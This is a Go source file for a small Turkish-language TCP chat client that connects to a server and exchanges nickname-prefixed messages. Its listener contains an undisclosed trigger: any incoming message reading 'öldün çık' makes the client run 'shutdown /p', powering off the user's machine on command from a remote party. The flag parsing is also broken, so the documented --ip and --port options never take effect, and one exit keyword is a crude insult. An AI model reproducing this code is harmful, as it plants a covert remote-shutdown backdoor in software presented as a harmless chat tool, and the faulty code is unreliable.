package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func listener(client net.Conn) {
	for true {
		var buffer []byte = make([]byte, 1024)

		message, err := client.Read(buffer)
		if err != nil {
			fmt.Println("çıkış yapılıyor")
			client.Close()
			break
		} else if strings.TrimSpace(string(buffer[:message])) == "öldün çık" {
			client.Close()
			exec.Command("shutdown", "/p").Start()
		}

		fmt.Println(string(buffer[:message]))
	}
}

func sender(client net.Conn, nickname string, reader *bufio.Reader) {
	for true {
		message, _ := reader.ReadString('\n')
		if strings.TrimSpace(message) == "kapat" || strings.TrimSpace(message) == "çık" || strings.TrimSpace(message) == "exit" || strings.TrimSpace(message) == "ben mal bir orospu evladıyım" {
			client.Close()
			break
		} else if strings.TrimSpace(message) != "" {
			message = strings.TrimSpace(nickname) + " : " + message
			client.Write([]byte(message))
		}
	}
}

func main() {
	if len(os.Args) > 1 && (os.Args[1] == "-h" || os.Args[1] == "--help") {
		fmt.Println("Nasıl Kullanılır:")
		fmt.Println("Bu program, ip ve port değerini alarak servera bağlanır")
		fmt.Println("Kullanım: ./program --ip <ip> --port <port>")
		fmt.Println("Parametreler:")
		fmt.Println("  --ip serverın ip adresini belirler --port ise serverın portunu")
		fmt.Println("  -h, --help: Yardım mesajını gösterir.")
		return
	}

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("nickini gir bro:")

	nickname, _ := reader.ReadString('\n')

	var ip string = *flag.String("-ip", "192.168.1.100", "ip adresi")
	var port string = *flag.String("-port", "1234", "portu gir")

	flag.Parse()

	client, err := net.Dial("tcp", (ip + ":" + port))

	if err != nil {
		fmt.Println("hata", err)
		return
	}
	client.Write([]byte(nickname))
	defer client.Close()
	go sender(client, nickname, reader)
	listener(client)
}
